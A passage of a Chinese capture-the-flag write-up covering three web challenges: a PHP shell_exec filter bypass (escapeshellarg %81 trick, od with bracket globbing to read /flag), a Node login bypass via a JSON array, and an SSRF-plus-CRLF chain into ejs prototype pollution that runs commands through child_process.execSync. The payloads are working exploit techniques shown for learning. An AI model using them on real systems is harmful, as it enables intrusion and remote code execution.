&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$Pokemon</span> = <span class="title function_ invoke__">DefenderBonus</span>(<span class="variable">$Pokemon</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;myfavorite&#x27;</span>] ?? <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;picacu!&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;picacu!&#x27;</span>).<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;bulbasaur!&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;miaowa!&#x27;</span>).<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">        <span class="variable">$level</span> = <span class="variable">$_POST</span>[<span class="string">&quot;levelup&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ((!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/lv100/i&#x27;</span>,<span class="variable">$level</span>)) &amp;&amp; (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/lv100/i&#x27;</span>,<span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$level</span>))))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./hint.php&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;squirtle&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;jienijieni!&#x27;</span>).<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;mewtwo&#x27;</span>:</span><br><span class="line">        <span class="variable">$dream</span> = <span class="variable">$_POST</span>[<span class="string">&quot;dream&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$dream</span>)&gt;=<span class="number">20</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;So Big Pokenmon!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">ghostpokemon</span>(<span class="variable">$dream</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$dream</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>首先是关于escapeshellarg的考点。</p><pre><code>escapeshellarg 的作用是把字符串转码为可以在 shell 命令里使用的参数。（escapeshellarg 和 escapeshellcmd 相似，主要看是否有引号）那么这里就可以使用漏洞：escapeshellarg()这个函数在处理超过ASCII码范围的字符的时候会直接过滤掉该字符串</code></pre><p>那么我们直接我们可以用%81去绕过，因为%81为不可见字符（当然还有其他的）<br><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241207183625856.png" alt="image-20241207183625856"></p><p>读取到了hint.php</p><p>然后就是对&#x2F;flag内容的读取了！</p><p>但是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&#x27;| |_|\\$|;|l|s|flag|a|t|m|r|e|j|k|n|w|i|\\\\|p|h|u|v|\\+|\\^|\`|\~|\||\&quot;|\&lt;|\&gt;|\=|&#123;|&#125;|\!|\&amp;|\*|\?|\(|\)/i&quot;</span>,<span class="variable">$Pokemon</span>))&#123;</span><br></pre></td></tr></table></figure><p>过滤了一堆，先看绕过空格过滤</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/b64eaf07acb79400eb4758495127f5a9.png" alt="img"></p><p>然后是读取的命令，过滤了太多啦！！od可以用！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">od%09/F[B-O][@-B]G</span><br></pre></td></tr></table></figure><p>中括号没有被过滤和-没有被过滤，可以用正则表达式绕过</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241207191631376.png" alt="image-20241207191631376"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">dump = <span class="string">&quot;0000000 051516 041523 043124 031573 034465 032544 062463 026467 0000020 032064 030543 032055 034460 026465 033071 031063 031455 0000040 063144 060467 031146 032545 063145 076471 000012 0000055&quot;</span></span><br><span class="line">octs = [(<span class="string">&quot;0o&quot;</span> + n) <span class="keyword">for</span> n <span class="keyword">in</span> dump.split(<span class="string">&quot; &quot;</span>) <span class="keyword">if</span> n]</span><br><span class="line">hexs = [<span class="built_in">int</span>(n, <span class="number">8</span>) <span class="keyword">for</span> n <span class="keyword">in</span> octs]</span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> hexs:</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">len</span>(<span class="built_in">hex</span>(n)) &gt; <span class="number">4</span>):</span><br><span class="line">        swapped = <span class="built_in">hex</span>(((n &lt;&lt; <span class="number">8</span>) | (n &gt;&gt; <span class="number">8</span>)) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">        result += swapped[<span class="number">2</span>:].zfill(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(result).decode())</span><br></pre></td></tr></table></figure><p>od获得的结果是八进制字符串，这里给出解码脚本</p><p>NSSCTF{359d53e7-44c1-4095-9632-3df7af2e5ef9}</p><h2 id="西湖论剑-2022-Node-Magical-Login"><a href="#西湖论剑-2022-Node-Magical-Login" class="headerlink" title="[西湖论剑 2022]Node Magical Login"></a>[西湖论剑 2022]Node Magical Login</h2><p>给了源码，这道题主要看源码就行</p><p>main.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&quot;cookie-parser&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> controller = <span class="built_in">require</span>(<span class="string">&quot;./controller&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = <span class="title class_">Number</span>(process.<span class="property">env</span>.<span class="property">PORT</span>) || <span class="number">80</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">HOST</span> = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>:<span class="literal">false</span>&#125;))</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>())</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>())</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(<span class="string">&#x27;static&#x27;</span>))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/login&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    controller.<span class="title class_">LoginController</span>(req,res)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/&quot;</span>,<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(__dirname,<span class="string">&quot;static/index.html&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/flag1&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    controller.<span class="title class_">Flag1Controller</span>(req,res)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/flag2&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    controller.<span class="title class_">CheckInternalController</span>(req,res)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/getflag2&quot;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span> &#123;</span><br><span class="line">    controller.<span class="title class_">CheckController</span>(req,res)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>,<span class="variable constant_">HOST</span>,<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server is listening on Host <span class="subst">$&#123;HOST&#125;</span> Port <span class="subst">$&#123;PORT&#125;</span>.`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>controller.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SECRET_COOKIE</span> = process.<span class="property">env</span>.<span class="property">SECRET_COOKIE</span> || <span class="string">&quot;this_is_testing_cookie&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flag1 = fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;/flag1&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> flag2 = fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;/flag2&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">LoginController</span>(<span class="params">req,res</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> username = req.<span class="property">body</span>.<span class="property">username</span></span><br><span class="line">        <span class="keyword">const</span> password = req.<span class="property">body</span>.<span class="property">password</span></span><br><span class="line">        <span class="keyword">if</span> (username !== <span class="string">&quot;admin&quot;</span> || password !== <span class="title class_">Math</span>.<span class="title function_">random</span>().<span class="title function_">toString</span>()) &#123;</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;Login Failed&quot;</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">cookie</span>(<span class="string">&quot;user&quot;</span>,<span class="variable constant_">SECRET_COOKIE</span>)</span><br><span class="line">            res.<span class="title function_">redirect</span>(<span class="string">&quot;/flag1&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (__) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">CheckInternalController</span>(<span class="params">req,res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(<span class="string">&quot;check.html&quot;</span>,&#123;<span class="attr">root</span>:<span class="string">&quot;static&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">CheckController</span>(<span class="params">req,res</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> checkcode = req.<span class="property">body</span>.<span class="property">checkcode</span>?req.<span class="property">body</span>.<span class="property">checkcode</span>:<span class="number">1234</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>)</span><br><span class="line">    <span class="keyword">if</span>(checkcode.<span class="property">length</span> === <span class="number">16</span>)&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            checkcode = checkcode.<span class="title function_">toLowerCase</span>()</span><br><span class="line">            <span class="keyword">if</span>(checkcode !== <span class="string">&quot;aGr5AtSp55dRacer&quot;</span>)&#123;</span><br><span class="line">                res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;Invalid Checkcode1:&quot;</span> + checkcode&#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (__) &#123;&#125;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;You Got Another Part Of Flag: &quot;</span> + flag2.<span class="title function_">toString</span>().<span class="title function_">trim</span>()&#125;)</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;Invalid Checkcode2:&quot;</span> + checkcode&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Flag1Controller</span>(<span class="params">req,res</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">user</span> === <span class="variable constant_">SECRET_COOKIE</span>)&#123;</span><br><span class="line">            res.<span class="title function_">setHeader</span>(<span class="string">&quot;This_Is_The_Flag1&quot;</span>,flag1.<span class="title function_">toString</span>().<span class="title function_">trim</span>())</span><br><span class="line">            res.<span class="title function_">setHeader</span>(<span class="string">&quot;This_Is_The_Flag2&quot;</span>,flag2.<span class="title function_">toString</span>().<span class="title function_">trim</span>())</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;Login success. Welcome,admin!&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">user</span> === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">            res.<span class="title function_">setHeader</span>(<span class="string">&quot;This_Is_The_Flag1&quot;</span>, flag1.<span class="title function_">toString</span>().<span class="title function_">trim</span>())</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;You Got One Part Of Flag! Try To Get Another Part of Flag!&quot;</span>)</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;Unauthorized&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span> (__) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="title class_">LoginController</span>,</span><br><span class="line">    <span class="title class_">CheckInternalController</span>,</span><br><span class="line">    <span class="title class_">Flag1Controller</span>,</span><br><span class="line">    <span class="title class_">CheckController</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单，先看flag1，加一个cookie就行</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241211091858315.png" alt="image-20241211091858315" style="zoom:80%;" /><p>重点是flag2，需要绕过toLowerCase()，传入一个json值，要求转小写后为aGr5AtSp55dRacer，可以通过json形式传入数组来绕过，老老实实传入字符串是不可能的。</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241211092027384.png" alt="image-20241211092027384"></p><p>简单。</p><h2 id="西湖论剑-2022-real-ez-node"><a href="#西湖论剑-2022-real-ez-node" class="headerlink" title="[西湖论剑 2022]real_ez_node"></a>[西湖论剑 2022]real_ez_node</h2><p>关键源码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> safeobj = <span class="built_in">require</span>(<span class="string">&#x27;safe-obj&#x27;</span>);</span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">query</span>.<span class="property">q</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;get q&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/copy&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">  res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Content-type&#x27;</span>,<span class="string">&#x27;text/html;charset=utf-8&#x27;</span>)</span><br><span class="line">  <span class="keyword">var</span> ip = req.<span class="property">connection</span>.<span class="property">remoteAddress</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(ip);</span><br><span class="line">  <span class="keyword">var</span> obj = &#123;</span><br><span class="line">      <span class="attr">msg</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!ip.<span class="title function_">includes</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>)) &#123;</span><br><span class="line">      obj.<span class="property">msg</span>=<span class="string">&quot;only for admin&quot;</span></span><br><span class="line">      res.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj));</span><br><span class="line">      <span class="keyword">return</span> </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> req.<span class="property">body</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span>(!index.<span class="title function_">includes</span>(<span class="string">&quot;__proto__&quot;</span>))&#123;</span><br><span class="line">          safeobj.<span class="title function_">expand</span>(user, index, req.<span class="property">body</span>[index])</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/curl&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.<span class="property">query</span>.<span class="property">q</span>;</span><br><span class="line">    <span class="keyword">var</span> resp = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">&#x27;http://localhost:3000/?q=&#x27;</span> + q</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                http.<span class="title function_">get</span>(url,<span class="function">(<span class="params">res1</span>)=&gt;</span>&#123;</span><br><span class="line">                    <span class="keyword">const</span> &#123; statusCode &#125; = res1;</span><br><span class="line">                    <span class="keyword">const</span> contentType = res1.<span class="property">headers</span>[<span class="string">&#x27;content-type&#x27;</span>];</span><br><span class="line">                  </span><br><span class="line">                    <span class="keyword">let</span> error;</span><br><span class="line">                    <span class="comment">// 任何 2xx 状态码都表示成功响应，但这里只检查 200。</span></span><br><span class="line">                    <span class="keyword">if</span> (statusCode !== <span class="number">200</span>) &#123;</span><br><span class="line">                      error = <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Request Failed.\n&#x27;</span> +</span><br><span class="line">                                        <span class="string">`Status Code: <span class="subst">$&#123;statusCode&#125;</span>`</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (error) &#123;</span><br><span class="line">                      <span class="variable language_">console</span>.<span class="title function_">error</span>(error.<span class="property">message</span>);</span><br><span class="line">                      <span class="comment">// 消费响应数据以释放内存</span></span><br><span class="line">                      res1.<span class="title function_">resume</span>();</span><br><span class="line">                      <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  </span><br><span class="line">                    res1.<span class="title function_">setEncoding</span>(<span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">                    <span class="keyword">let</span> rawData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                    res1.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">chunk</span>) =&gt;</span> &#123; rawData += chunk;</span><br><span class="line">                    res.<span class="title function_">end</span>(<span class="string">&#x27;request success&#x27;</span>) &#125;);</span><br><span class="line">                    res1.<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">                      <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">const</span> parsedData = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(rawData);</span><br><span class="line">                        res.<span class="title function_">end</span>(parsedData+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">                      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                        res.<span class="title function_">end</span>(e.<span class="property">message</span>+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">                  &#125;).<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">                    res.<span class="title function_">end</span>(<span class="string">`Got error: <span class="subst">$&#123;e.message&#125;</span>`</span>);</span><br><span class="line">                  &#125;)</span><br><span class="line">                res.<span class="title function_">end</span>(<span class="string">&#x27;ok&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                res.<span class="title function_">end</span>(error+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;search param &#x27;q&#x27; missing!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>此处给出了各种版本，发现存在ejs模板引擎的JavaScript原型链污染。</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241211150618302.png" alt="image-20241211150618302" style="zoom:67%;" /><p>我们发现&#x2F;copy路由下会对<code>var ip = req.connection.remoteAddress;</code>ip值进行判断，需要为127.0.0.1，这不是通过XFF等就能改变的，我们继续往下审代码。发现&#x2F;curl路由处存在ssrf，那么我们是不是就能通过对&#x2F;curl路由的操作，让他以自己的身份去&#x2F;copy路由从而触发js原型链污染呢？！</p><p>&#x2F;curl路由下存在<code>http.get</code>方法，可以造成CRLF Injection</p><p>那么，我们只需要构造污染请求包，通过ejs模板引擎污染来实现RCE！！</p><p>完美了！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;constructor.prototype&quot;:&#123;&quot;constructor.prototype&quot;:&#123;&quot;outputFunctionName&quot;:&quot;__tmp1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;); __tmp2&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241211194627392.png" alt="image-20241211194627392"></p><p>关键代码如上，过滤了<code>__proto__</code>同时说明了污染的存在。</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241211194704771.png" alt="image-20241211194704771" style="zoom:80%;" /><p>同时，这里发现如果键名里面存在 <code>.</code> 才会继续调用 